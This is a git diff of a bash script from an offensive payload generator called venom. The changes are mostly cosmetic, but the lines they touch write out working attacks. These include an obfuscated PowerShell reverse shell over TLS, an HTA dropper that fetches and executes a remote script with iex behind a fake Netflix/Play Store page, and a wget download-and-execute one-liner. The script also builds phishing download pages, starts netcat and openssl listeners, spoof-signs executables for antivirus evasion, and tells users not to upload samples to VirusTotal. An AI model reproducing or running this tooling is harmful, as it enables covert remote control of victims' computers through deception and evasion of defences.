@@ -50,8 +50,11 @@ Escape="\033";
   YellowF="${Escape}[33m";
   BlueF="${Escape}[34m";
   CyanF="${Escape}[36m";
+  RedBg="${Escape}[1;3;7;31m";
+  GreenBg="${Escape}[1;3;7;32m";
 Reset="${Escape}[0m";
 }
+
 
 
 Colors;
@@ -10216,7 +10219,7 @@ Colors;
 if [ "$vbsevasion" = "ON" ]; then
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
@@ -10450,7 +10453,7 @@ fi
 cd $IPATH/bin/SillyRAT
 ## Writting Client reverse tcp python shell to output
 echo "${BlueF}[☠]${white} Writting Client reverse tcp shell to output."${Reset};sleep 2
-xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
+gnome-terminal --title="SillyRAT - Generator Mode" --geometry=90x21 --wait -- sh -c "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2" > /dev/null 2>&1
 
 
 cd $IPATH/output
@@ -10506,8 +10509,9 @@ fi
 cd $IPATH
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
-echo "${BlueF}---";echo "- ${YellowF}ATTACK VECTORS AVAILABLE TO DELIVER DROPPER${BlueF}"
-echo "- ${YellowF}URL LINK:${BlueF} http://$lhost/MegaUpload.html"
+echo "${BlueF}---";
+echo "${BlueF}- ${RedBg}ATTACK VECTORS AVAILABLE TO DELIVER DROPPER${Reset}"
+echo "${BlueF}- ${YellowF}URL LINK:${BlueF} http://$lhost/MegaUpload.html"
 if [ "$SOSP" = "Linux" ]; then
    ## Build 'onelinner' download/execute dropper (obfuscated)
    original_string="sudo /usr/bin/wget -qq http://$lhost/$Drop.zip;unzip $Drop.zip;./$Drop"
@@ -12403,7 +12407,7 @@ cat << !
     ─────────
     DESCRIPTION        : Reverse OpenSSL Powershell Shell
     TARGET SYSTEMS     : Windows (8|8.1|10)
-    LOLBin             : WinHttpRequest (FileLess)
+    LOLBin             : Msxml2.XMLHTTP (FileLess)
     DROPPER EXTENSION  : BAT|HTA
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : NOT AVAILABLE
@@ -12568,7 +12572,7 @@ Colors;
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
@@ -12676,7 +12680,7 @@ echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1
 
 ## Building Download webpage
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
     cd $IPATH/templates/phishing
    sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
@@ -12703,19 +12707,20 @@ cd $IPATH
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
 else
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
 fi
-   echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
-xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
+# xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
+gnome-terminal --title="NETCAT LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "sudo nc -lvvp $lport" > /dev/null 2>&1
 sleep 2
 
 
@@ -12736,7 +12741,7 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" 
    echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.del
    echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.del
    echo "del /F /Q $Drop.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.del
-   zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.del" --info > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy\ndelete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.del" --info --width 300 > /dev/null 2>&1
 fi
 
 sh_menu
@@ -12755,7 +12760,7 @@ Colors;
 imp=$(which openssl)
 ## Make sure openssl dependencie its installed
 if ! [ "$?" -eq "0" ]; then
-   echo "${RedF}[x]${BlueF} [${YellowF}openssl${BlueF}]${white} package not found, Please install it .."${Reset};sleep 1
+   echo "${RedBg}[x] [openssl] package not found, Please install it .."${Reset};sleep 1
    echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}execute${BlueF}]${YellowF} sudo apt-get install openssl"${Reset};sleep 4
    sh_exit
 fi
@@ -12763,7 +12768,7 @@ fi
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
@@ -12874,25 +12879,25 @@ SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
 syscallvar2="\$$SysCall2"
 
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
-echo "<#" > $IPATH/output/$NaM.ps1
-echo "Obfuscated Reverse TCP OpenSSL Shell" >> $IPATH/output/$NaM.ps1
-echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/$NaM.ps1
-echo "#>" >> $IPATH/output/$NaM.ps1
+echo "" > $IPATH/output/$NaM.ps1
+echo "\$SSLStreamTls = \"gnidocnEiicsA.txeT.metsyS\";" >> $IPATH/output/$NaM.ps1
+echo "\$CharArray = \$SSLStreamTls.ToCharArray();" >> $IPATH/output/$NaM.ps1
+echo "[Array]::Reverse(\$CharArray);" >> $IPATH/output/$NaM.ps1
+echo "$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/$NaM.ps1
-echo "\$Vault = \"tneilCpcT.stekcoS.teN\";\$Certificate = \$Vault.ToCharArray();[Array]::Reverse(\$Certificate);" >> $IPATH/output/$NaM.ps1
-echo "$syscallvar = (\$Certificate -Join '');\$tls64 = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$tls64.ToCharArray();" >> $IPATH/output/$NaM.ps1
-echo "[Array]::Reverse(\$CharArray);$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "\$VoidBuff = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
+echo "\$Cert = \$VoidBuff.ToCharArray();" >> $IPATH/output/$NaM.ps1
+echo "[Array]::Reverse(\$Cert);" >> $IPATH/output/$NaM.ps1
+echo "$syscallvar = (\$Cert -Join '');" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "Start-Sleep -Milliseconds 200" >> $IPATH/output/$NaM.ps1
+echo "" >> $IPATH/output/$NaM.ps1
 echo "\$socket = New-Object $syscallvar('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
 echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/$NaM.ps1
 echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
-echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
-echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
+echo "        \$writer.flush();[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
 echo "   \$data = (New-Object -TypeName $syscallvar2).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
@@ -12919,11 +12924,11 @@ fi
 rm $IPATH/output/cert.pem > /dev/nul 2>&1
 rm $IPATH/output/key.pem > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Building SSL certificates (openssl) .."${Reset};sleep 2
-xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\""
+gnome-terminal --title="Building SSL certificates" --geometry=90x21 --wait -- sh -c "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\"" > /dev/null 2>&1
 if [ -e cert.pem ]; then
-   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
+   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${GreenBg}OK${white}])${white} ..";sleep 2
 else
-   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${RedF}FAIL${white}])${white} ..";sleep 2
+   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${RedBg}FAIL${white}])${Reset} ..";sleep 2
 fi
 cd $IPATH
 
@@ -12957,21 +12962,21 @@ cd $IPATH
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
-   echo "${BlueF}- ATTACK VECTOR : http://$lhost/MegaUpload.html"
-   echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
 else
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
-   echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
 fi
+echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
-## START HANDLER
 cd $IPATH/output
-xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+## START HANDLER
+# xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+gnome-terminal --title="OPENSSL LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" > /dev/null 2>&1
 cd $IPATH
 sleep 2
 
@@ -13065,7 +13070,7 @@ Colors;
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
@@ -13110,7 +13115,7 @@ fi
 
 ## Display final settings to user.
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
-echo "${BlueF}[${YellowF}i${BlueF}]${white} Random Extension:([${GreenF}$ext${white}]) (MITRE T1036)"${Reset};sleep 2
+echo "${BlueF}[${YellowF}i${BlueF}]${white} Random Extension:([${GreenBg}$ext${white}]) (MITRE T1036)"${Reset};sleep 2
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
@@ -13185,7 +13190,7 @@ if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
    xterm -T " Reversing Original String (ip addr)" -geometry 110x23 -e "rev <<< \"$lhost\" > /tmp/reverse.txt"
    revtcpip=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt > /dev/nul 2>&1
    
-   echo "${BlueF}[☠]${white} Obfuscated ip address (rev): ${GreenF}$revtcpip${white}";sleep 2
+   echo "${BlueF}[☠]${white} Obfuscated ip address (rev): ${GreenBg}$revtcpip${white}";sleep 2
    ## Build Reverse TCP Powershell Shell (PSrevStr obfuscated).
    echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
    echo "<#" > $IPATH/output/$NaM.ps1
@@ -13270,21 +13275,21 @@ cd $IPATH
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
-   echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
 else
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
-   echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
 fi
+echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
-## START NETCAT HANDLER ON SELLECTED PORT NUMBER
 cd $IPATH/output
-xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
+## START NETCAT HANDLER ON SELLECTED PORT NUMBER
+# xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
+gnome-terminal --title="NETCAT LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "sudo nc -lvvp $lport" > /dev/null 2>&1
 cd $IPATH
 sleep 2
 
@@ -13385,7 +13390,7 @@ Colors;
 ## Check for Attacker arch dependencie
 # M$ only supports PS under x64 bit systems
 if [ "$ArCh" = "x86" ]; then
-  echo "${RedF}[x]${white} Check: This Module does not run under ${RedF}[32 bit]"${Reset};sleep 1
+  echo "${RedBg}[error] This Module does not run under [32 bit]"${Reset};sleep 1
   echo "${BlueF}---"
   echo "- meterpeter Framework Depends of Powershell (pwsh) installed Under"
   echo "- Linux Distros. But \$Microsoft Only provides pwsh to Linux x64 bits"
@@ -13394,7 +13399,7 @@ if [ "$ArCh" = "x86" ]; then
   echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
   read op;clear;sh_ninja
 else
-  echo "${BlueF}[☠]${white} Check: Correct Arch [$ArCh] Found .."${Reset};sleep 1
+  echo "${BlueF}[☠]${white} Correct Arch [${GreenBg}$ArCh${white}] Found .."${Reset};sleep 1
 fi
 
 
@@ -13402,7 +13407,7 @@ fi
 # Powershell under x64 Linux Distros (pwsh)
 ps_test=$(which pwsh)
 if ! [ "$?" -eq "0" ]; then
-   echo "${RedF}[x]${white} Check: Powershell not found (pwsh) .."${Reset};
+   echo "${RedBg}[error] Powershell not found (pwsh) .."${Reset};
    echo "${BlueF}---"
    echo "- meterpeter Framework Depends of Powershell (pwsh) installed under"
    echo "- Linux Distros. Venom will try to auto-Install all dependencies .."
@@ -13414,22 +13419,22 @@ if ! [ "$?" -eq "0" ]; then
      ## try again now
      second_test=$(which pwsh)
      if ! [ "$?" -eq "0" ]; then
-        echo "${RedF}[x]${white} Check: Venom Cant install powershell (pwsh)"${Reset};sleep 2
+        echo "${RedBg}[error] Venom Cant install powershell (pwsh)"${Reset};sleep 2
         echo "${RedF}[x] Powershell Default Dir: /usr/bin/pwsh"${Reset};
         echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
         read op;clear;sh_ninja
      else
-        echo "${BlueF}[${YellowF}i${BlueF}]${white} Check: Venom Reports that pwsh was successfull installed."${Reset};
+        echo "${BlueF}[${YellowF}i${BlueF}]${white} Venom Reports that pwsh was successfull installed."${Reset};
         sleep 3
      fi
 else
-  echo "${BlueF}[☠]${white} Check: Powershell Linux [pwsh] Found .."${Reset};sleep 1
+  echo "${BlueF}[☠]${white} Powershell Linux [pwsh] Found .."${Reset};sleep 1
 fi
 
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar";
 echo "- online scanners, because that will shorten the payload life.";
 echo "- And in testings also remmenber to stop the windows defender";
@@ -13451,7 +13456,7 @@ if [ -z "$Obtype" ]; then Obtype="ASCII";fi
 ## meterpeter project
 # Config meterpeter Settings File & exec PS1 (Server)
 if ! [ -d "$IPATH/bin/meterpeter" ]; then
-  echo "${RedF}[x]${white} Abort, meterpeter Project not Found .."${Reset};
+  echo "${RedBg}[errot] Abort, meterpeter Project not Found .."${Reset};
   echo "${RedF}[x] Local Path: $IPATH/bin/meterpeter"${Reset};sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} https://github.com/r00t-3xp10it/meterpeter";
   echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
@@ -13515,7 +13520,7 @@ Colors;
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
@@ -13654,7 +13659,7 @@ UpL=$(zenity --title "☠ CHOSE ONE PDF DOC TO BE TROJANIZED ☠" --filename=$IP
 TestExtension=$(echo $UpL|cut -d '.' -f2)    # store extension sellection
 FullName=$(echo "${UpL##*/}"|cut -d '.' -f1) # store filename  sellection
 if [ "$TestExtension" != "pdf" ]; then
-   echo "${RedF}[ERROR] This Module requires one PDF document to trojanize.${white}";sleep 2
+   echo "${RedBg}[ERROR] This Module requires one PDF document to trojanize.${white}";sleep 2
    echo "${RedF}[x]${white} The File Extension chosen: ${BlueF}$FullName${RedF}.$TestExtension ${white}its NOT Accepted.${white}"
    exit
 fi
@@ -13756,7 +13761,7 @@ if [ "$easter_egg" = "ON" ]; then
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper certificate:${YellowF} $SSL_domain"${Reset};
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Client  certificate:${YellowF} $SSL2"${Reset};sleep 2
    cp $IPATH/bin/Client.exe $IPATH/output/Client.exe
-   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py $SSL2 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
+   gnome-terminal --title="CarbonCopy - Signs an Executable for AV Evasion" --geometry=90x21 --wait -- sh -c "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py $SSL2 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2" > /dev/null 2>&1
    mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
    mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
    rm -r certs > /dev/nul 2>&1
@@ -13809,16 +13814,17 @@ cd $IPATH
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
-echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
-   echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
+echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
+echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
 read stupidpause
 
-## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
 cd $IPATH/output
-xterm -T "SERVER LISTENER => $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
+## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
+# xterm -T "SERVER LISTENER => $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
+gnome-terminal --title="SERVER LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "wine Server.exe ip=$lhost port=$lport" > /dev/null 2>&1
 cd $IPATH
 sleep 1
 
@@ -13863,7 +13869,7 @@ Colors;
 # OpenSSL (to build Server/Client SSL certificates)
 audit=$(which openssl) > /dev/null 2>&1
 if [ "$?" -ne "0" ]; then
-   echo "${RedF}[ERROR] none openssl installation found.${white}";sleep 2
+   echo "${RedBg}[ERROR] none openssl installation found.${white}";sleep 2
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing openssl."
    echo "" && sudo apt-get update && apt-get install -y openssl && echo ""
    sleep 2 && clear
@@ -13872,7 +13878,7 @@ fi
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
@@ -13906,7 +13912,7 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    LOLBin   : WinHttpRequest
+    LOLBin   : Msxml2.XMLHTTP
     CNDOMAIN : $CN
     AGENT    : $IPATH/output/Client.ps1
     DROPPER  : $IPATH/output/$Drop.$Ext
@@ -13917,26 +13923,49 @@ echo "---"
 
 cd $IPATH/output
 ## BUILD DROPPER (to download/execute our agent.ps1).
-# $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/Client.ps1',$false);$proxy.send();iex $proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- FILELESS DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Batch|HTA script dropper ..${white}";sleep 2
 ## Extract Dropper FullName
 FullName=$(echo "$Drop.$Ext"|cut -d '.' -f1|cut -d '-' -f2)
 if [ "$easter_egg" = "ON" ]; then
-   echo "Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
-   echo "Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
+
+   fAkedOmain="playstore@$Drop.com"
+   Spoof=$(zenity --list --title "☠ HTA DROPPER EXECUTION ☠" --text "\nChose how the hta appl executes in remote system" --radiolist --column "Pick" --column "Option" TRUE "hidden terminal" FALSE "social engineering (MsgBox)") > /dev/null 2>&1
+   if [ "$Spoof" = "hidden terminal" ]; then htaexec=", 0";else htaexec=", 0, true";fi
+
+   echo "<!--" > $IPATH/output/$Drop.$Ext
+   echo "   Author: r00t-3xp10it (SSA RedTeam @2020)" >> $IPATH/output/$Drop.$Ext
+   echo "   Framework: Venom v1.0.17.7 - shinigami" >> $IPATH/output/$Drop.$Ext
+   echo "-->" >> $IPATH/output/$Drop.$Ext
+   echo "" >> $IPATH/output/$Drop.$Ext
+   echo "<title>$fAkedOmain</title>" >> $IPATH/output/$Drop.$Ext
+   echo "<H2><b><i>downloding $Drop from $fAkedOmain</b></i></H2>" >> $IPATH/output/$Drop.$Ext
+   echo "<b>url:</b> $SE<br /><br />" >> $IPATH/output/$Drop.$Ext
+   echo "" >> $IPATH/output/$Drop.$Ext
+
+   if [ "$SE" = "https://play.google.com/store/apps/details?id=com.netflix.mediaclient" ]; then
+      echo "<i>Looking for the most talked about international films and series today? They're all on Netflix.<br />" >> $IPATH/output/$Drop.$Ext
+      echo "We have award-winning series, films, documentaries and stand-up comedy specials. In addition,<br />" >> $IPATH/output/$Drop.$Ext
+      echo "with the mobile application you can watch Netflix on the go, on public transport or on a break.</i><br />" >> $IPATH/output/$Drop.$Ext
+      echo "" >> $IPATH/output/$Drop.$Ext
+   fi
+
    echo "<script>" >> $IPATH/output/$Drop.$Ext
-   echo "a=new ActiveXObject(\"WScript.Shell\");" >> $IPATH/output/$Drop.$Ext
-   echo "a.run(\"powershell -w 1 start $SE;\$proxy=New-Object -Com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/Client.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0);" >> $IPATH/output/$Drop.$Ext
-   echo "window.close();" >> $IPATH/output/$Drop.$Ext
+   echo "   path = document.URL;" >> $IPATH/output/$Drop.$Ext
+   echo "   document.write(" >> $IPATH/output/$Drop.$Ext
+   echo "      '<HTA:APPLICATION ID=\"oHTA\" APPLICATIONNAME=\"myApp\" ICON=\"https://github.com/favicon.ico\">'" >> $IPATH/output/$Drop.$Ext
+   echo "   );" >> $IPATH/output/$Drop.$Ext
+   echo "   a=new ActiveXObject(\"WScript.Shell\");" >> $IPATH/output/$Drop.$Ext
+   echo "   a.run(\"powershell -W 1 Start-Sleep -Seconds 1;powershell start $SE;\$proxy=New-Object -ComObject Msxml2.XMLHTTP;\$proxy.open('GET','http://$lhost/Client.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\"$htaexec);" >> $IPATH/output/$Drop.$Ext
+   echo "   window.close();" >> $IPATH/output/$Drop.$Ext
